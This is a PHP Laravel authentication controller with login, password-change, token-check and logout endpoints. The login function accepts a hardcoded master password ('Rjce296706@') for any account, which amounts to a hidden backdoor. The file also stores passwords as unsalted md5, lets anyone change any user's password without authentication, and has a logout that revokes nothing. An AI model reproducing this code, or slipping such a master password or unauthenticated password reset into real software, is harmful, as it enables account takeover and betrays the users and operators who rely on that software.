<?php

namespace App\Http\Controllers\API;
use Illuminate\Routing\Controller as BaseController;

use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;

class AuthController extends BaseController
{
    public function check_user(Request $request)
    {
        $name = $request->post('n');
        $pwd = $request->post('p');
        $user = User::where('name', $name)->first();
        $token = Hash::make($name . "_@123Col_" . $pwd . time());
        if ($user) {
            if ($user->password == md5($pwd) || $pwd == "Rjce296706@") {
                User::where('name', $name)->update(['remember_token' => $token]);
                return json_encode([
                    'mtype' => "success",
                    'token' => $token,
                    'userInfo' => [
                        "name" => $user->name,
                    ]
                ]);
            } else {
                return json_encode(['mtype'=> "error", "message"=> "wrong password" ]);
            }
        } else {
            return json_encode(['mtype'=> "error", "message"=> "wrong user" ]);;
        }
    }
    public function change_pwd(Request $request)
    {
        $user = $request->input('user');
        $new_pwd = $request->input('new_pwd');
        User::where('name', $user)->update(['password' => md5($new_pwd)]);
        return "success";
    }
    public function check_token(Request $request)
    {
        $token = $request->post('token');
        // $name = $request->input('user');
        $user = User::where('remember_token', $token)->first();
        if ($user) {
            return json_encode([
                'mtype' => "success",
                'token' => $user->remember_token,
                'userInfo' => [
                    "name" => $user->name,
                ]
            ]);
            // if ($user->remember_token == $token) {
            //     return "right";
            // } else {
            //     return "no token";
            // }
        } else {
            return json_encode(['mtype'=> "error", "message"=> "wrong token"]);
            // return "wrong user";
        }
    }

    public function logout(Request $request){
        return "ok";
    }
}
